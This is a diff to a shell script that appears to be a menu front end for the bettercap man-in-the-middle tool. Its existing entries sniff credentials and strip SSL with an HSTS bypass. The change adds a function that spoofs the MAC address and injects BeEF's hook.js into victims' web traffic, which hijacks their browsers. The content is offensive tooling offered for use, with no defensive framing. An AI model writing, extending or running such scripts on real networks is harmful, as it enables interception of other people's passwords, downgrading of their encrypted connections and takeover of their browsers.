@@ -155,7 +155,7 @@ function ChangeMacAddress-Random () {
 		ChangeMacAddress-Random
 		sudo bettercap -I $interface -X --custom-parser "pass"
     }
-	#------------------------------------------------
+    #------------------------------------------------
     # SSL Stripping and HSTS Bypass
     #------------------------------------------------
     Bettercap-SSLStrHSTSBypass()
@@ -165,6 +165,15 @@ function ChangeMacAddress-Random () {
 		sudo bettercap -I $interface --proxy -P POST
     }
     #------------------------------------------------
+    # Inject hook.js with BeEF Project module
+    #------------------------------------------------
+    Bettercap-BeEFProject()
+    {
+		SelectInterface
+		ChangeMacAddress-Random
+		sudo bettercap -I $interface --proxy --proxy-module=/usr/share/bettercap/bettercap-proxy-modules/beefbox.rb
+    }
+    #------------------------------------------------
     # Main
     #================================================
     Menu \
@@ -172,4 +181,5 @@ function ChangeMacAddress-Random () {
       Bettercap-Install "Install Bettercap" \
       Bettercap-CredSniff "Credentials Sniffer" \
       Bettercap-CredSniff-ParsePasswd "Credentials Sniffer - Parse 'password' expression" \
-      Bettercap-SSLStrHSTSBypass "SSL Stripping and HSTS Bypass"
+      Bettercap-SSLStrHSTSBypass "SSL Stripping and HSTS Bypass" \
+      Bettercap-BeEFProject "Inject hook.js with BeEF Project module"
